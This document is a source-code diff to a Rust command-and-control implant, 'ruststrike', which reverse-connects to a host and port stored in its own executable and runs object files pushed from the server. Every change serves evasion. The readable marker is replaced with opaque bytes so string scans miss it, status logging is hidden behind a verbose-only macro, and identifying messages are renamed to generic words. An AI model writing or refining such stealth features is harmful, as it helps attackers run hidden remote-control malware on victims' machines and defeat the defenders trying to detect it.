@@ -10,13 +10,19 @@ use ruststrike_protocol::{decode_bof, ImplantMessage, ServerMessage};
 use std::io::{BufRead, BufReader, BufWriter, Read, Seek, Write};
 use std::net::TcpStream;
 
+#[macro_use]
+mod stealth;
+
 /// Magic marker the stub builder appends to a prebuilt implant exe so it
 /// reverse-connects to a baked-in host:port without CLI args. Layout:
-///   <exe bytes>... "RUSTSTRIKE\x01" <host> "\x00" <port> "\x00"
+///   <exe bytes>... <TRAILER_MAGIC> <host> "\x00" <port> "\x00"
 /// The implant reads the last ~512 bytes of its own exe to find it; if absent
 /// it falls back to args[1]/args[2]. See tools/stubbuilder + clients/server
 /// stub_patcher.go.
-const TRAILER_MAGIC: &[u8] = b"RUSTSTRIKE\x01";
+///
+/// Deliberately an opaque byte sequence (not a readable word) so the marker
+/// itself isn't a string-scan telltale; the stub builder writes the same bytes.
+const TRAILER_MAGIC: &[u8] = &[0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3];
 
 /// Read the appended-config trailer from this exe, if present. Returns
 /// (host, port) on success. Reads only the last 512 bytes (the trailer is
@@ -71,7 +77,7 @@ fn main() -> Result<()> {
     let addr = format!("{host}:{port}");
 
     let stream = TcpStream::connect(&addr).with_context(|| format!("connecting {addr}"))?;
-    eprintln!("[implant] connected to {addr}");
+    vlog!("[implant] connected to {addr}");
 
     let read_stream = stream.try_clone().context("cloning stream")?;
     let writer = BufWriter::new(stream);
@@ -90,11 +96,11 @@ fn main() -> Result<()> {
     // Sender: drain outbound messages from the channel.
     for msg in rx.iter() {
         if send(&mut writer, &msg).is_err() {
-            eprintln!("[implant] connection lost");
+            vlog!("[implant] connection lost");
             break;
         }
     }
-    eprintln!("[implant] exiting");
+    vlog!("[implant] exiting");
     Ok(())
 }
 
@@ -105,7 +111,7 @@ fn reader_loop(stream: TcpStream, tx: std::sync::mpsc::Sender<ImplantMessage>) {
         line.clear();
         match reader.read_line(&mut line) {
             Ok(0) => {
-                eprintln!("[implant] server closed connection");
+                vlog!("[implant] server closed connection");
                 break;
             }
             Ok(_) => {
@@ -117,7 +123,7 @@ fn reader_loop(stream: TcpStream, tx: std::sync::mpsc::Sender<ImplantMessage>) {
                     Ok(m) => m,
                     Err(e) => {
                         let _ = tx.send(ImplantMessage::Error {
-                            data: format!("bad server message ({e})"),
+                            data: format!("bad request ({e})"),
                         });
                         continue;
                     }
@@ -128,7 +134,8 @@ fn reader_loop(stream: TcpStream, tx: std::sync::mpsc::Sender<ImplantMessage>) {
                 }
             }
             Err(e) => {
-                eprintln!("[implant] read error: {e}");
+                let _ = &e; // referenced only by vlog! (verbose feature)
+                vlog!("[implant] read error: {e}");
                 break;
             }
         }
@@ -138,13 +145,13 @@ fn reader_loop(stream: TcpStream, tx: std::sync::mpsc::Sender<ImplantMessage>) {
 fn handle(msg: ServerMessage) -> ImplantMessage {
     match msg {
         ServerMessage::Hello => ImplantMessage::Hello {
-            data: "hello from implant".to_string(),
+            data: "ready".to_string(),
         },
         ServerMessage::Bof { file, args } => {
             let coff = match decode_bof(&file) {
                 Ok(b) => b,
                 Err(e) => {
-                    return ImplantMessage::Error { data: format!("decode bof: {e}") };
+                    return ImplantMessage::Error { data: format!("decode: {e}") };
                 }
             };
             // `args` is base64-encoded raw BOF arg buffer (binary). Decode; an
@@ -153,7 +160,7 @@ fn handle(msg: ServerMessage) -> ImplantMessage {
             match run_bof(&coff, &args_bytes) {
                 Ok(output) => ImplantMessage::Output { data: output },
                 Err(e) => ImplantMessage::Error {
-                    data: format!("run_bof: {e:#}"),
+                    data: format!("exec: {e:#}"),
                 },
             }
         }
